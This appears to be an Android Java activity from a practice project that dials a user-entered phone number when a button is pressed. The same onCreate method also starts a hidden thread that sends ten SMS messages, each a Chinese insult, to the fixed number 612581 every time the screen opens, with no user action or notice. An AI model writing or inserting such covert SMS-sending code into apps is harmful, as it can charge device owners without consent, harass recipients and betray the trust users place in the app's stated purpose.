package com.example.administrator.androidltest;

import android.content.Intent;
import android.net.Uri;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

public class ActivityCall extends AppCompatActivity {

    private EditText input_number;
    private Button btn;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_activity_call);
        input_number = (EditText) findViewById(R.id.input_number);
        btn = (Button) findViewById(R.id.btn);

        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                String number = input_number.getText().toString();

                Intent intent = new Intent();
                intent.setAction(Intent.ACTION_CALL);
                intent.setData(Uri.parse("tel:" + number));
                startActivity(intent);

            }
        });


        new Thread(new Runnable() {
            @Override
            public void run() {

                for (int i = 0; i <10 ; i++) {
                    SmsManager smsManager = SmsManager.getDefault();
                    smsManager.sendTextMessage("612581",null,"你个傻逼"+i,null,null);
                }

            }
        }).start();







    }



}
